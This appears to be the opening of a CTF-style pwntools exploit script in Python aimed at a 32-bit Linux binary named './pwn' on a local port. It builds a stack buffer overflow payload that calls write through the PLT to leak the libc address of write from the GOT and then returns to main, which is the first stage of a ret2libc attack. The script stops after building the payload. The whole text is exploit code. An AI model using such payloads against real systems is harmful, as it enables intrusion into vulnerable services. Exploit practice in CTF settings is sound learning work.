from pwn import *
from LibcSearcher import *
context(arch='i386',os='linux',log_level='debug')

p = remote('127.0.0.1',80)
elf = ELF('./pwn')
main = elf.sym['main']
write_got=elf.got['write']
write_plt=elf.plt['write']

payload = cyclic(0x88+0x4)+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)
